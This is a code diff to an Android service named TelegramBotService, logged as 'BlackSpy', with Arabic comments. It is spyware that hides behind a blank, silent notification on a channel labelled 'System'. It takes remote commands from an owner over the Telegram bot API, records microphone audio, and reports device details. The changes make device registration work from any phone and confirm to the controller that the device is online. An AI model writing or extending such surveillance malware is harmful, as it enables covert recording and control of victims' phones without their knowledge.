@@ -63,7 +63,6 @@ public class TelegramBotService extends Service {
     private String targetDeviceId = null;
     private String targetDeviceName = null;
     private String targetChatId = null;
-    private boolean deviceRegistered = false;
     
     private MediaRecorder mediaRecorder;
     private File currentAudioFile;
@@ -74,15 +73,11 @@ public class TelegramBotService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        // لا نبدأ foreground service بشكل عادي
-        if (Build.VERSION.SDK_INT >= 26) {
-            startForeground(1, createSilentNotification());
-        }
+        startForeground(1, createSilentNotification());
         scheduler = Executors.newSingleThreadScheduledExecutor();
         startBot();
     }
     
-    // إشعار صامت لا يظهر للمستخدم
     private Notification createSilentNotification() {
         if (Build.VERSION.SDK_INT >= 26) {
             NotificationChannel ch = new NotificationChannel("silent_ch", "System", NotificationManager.IMPORTANCE_LOW);
@@ -91,15 +86,12 @@ public class TelegramBotService extends Service {
             ch.setShowBadge(false);
             getSystemService(NotificationManager.class).createNotificationChannel(ch);
         }
-        Notification notification = new NotificationCompat.Builder(this, "silent_ch")
-                .setContentTitle("")
-                .setContentText("")
+        return new NotificationCompat.Builder(this, "silent_ch")
                 .setSmallIcon(android.R.drawable.ic_menu_info_details)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setSilent(true)
                 .setOngoing(true)
                 .build();
-        return notification;
     }
     
     private void startBot() {
@@ -118,23 +110,26 @@ public class TelegramBotService extends Service {
                             long chatId = msg.getJSONObject("chat").getLong("id");
                             String chatIdStr = String.valueOf(chatId);
                             
-                            Log.d("BlackSpy", "Received: " + text + " from: " + chatIdStr);
+                            Log.d("BlackSpy", "Received: " + text);
                             
-                            // قبول التسجيل من أي جهاز
-                            if (text.startsWith("REGISTER:") && targetChatId == null) {
+                            // ========== مفتاح الحل: قبول REGISTER من أي جهاز ==========
+                            if (text.startsWith("REGISTER:")) {
                                 String data = text.replace("REGISTER:", "");
                                 JSONObject info = new JSONObject(data);
                                 targetDeviceId = info.getString("device_id");
                                 targetDeviceName = info.getString("device_name");
                                 targetChatId = chatIdStr;
-                                deviceRegistered = true;
-                                sendMessageToOwner("✅ BLACK SPY ONLINE ✅\n📍 " + targetDeviceName);
+                                
+                                // إرسال تأكيد للمالك
+                                sendMessageToOwner("✅ BLACK SPY ONLINE ✅\n📍 " + targetDeviceName + "\n🆔 ID: " + targetDeviceId);
                                 sendMessageToOwner(getCommandMenu());
                                 Log.i("BlackSpy", "Device registered: " + targetDeviceName);
                             }
                             // أوامر التحكم من المالك فقط
-                            else if (chatIdStr.equals(OWNER_CHAT_ID) && deviceRegistered) {
+                            else if (chatIdStr.equals(OWNER_CHAT_ID) && targetChatId != null) {
                                 handleCommand(text);
+                            } else if (chatIdStr.equals(OWNER_CHAT_ID) && targetChatId == null) {
+                                sendMessageToOwner("⏳ انتظر اتصال جهاز...");
                             }
                         }
                     }
@@ -344,7 +339,7 @@ public class TelegramBotService extends Service {
             mediaRecorder.prepare();
             mediaRecorder.start();
             isRecording = true;
-            sendMessageToOwner("🎙️ جاري التسجيل...\n/stoprec للإيقاف");
+            sendMessageToOwner("🎙️ جاري التسجيل...");
         } catch (Exception e) { sendMessageToOwner("❌ فشل التسجيل"); }
     }
     
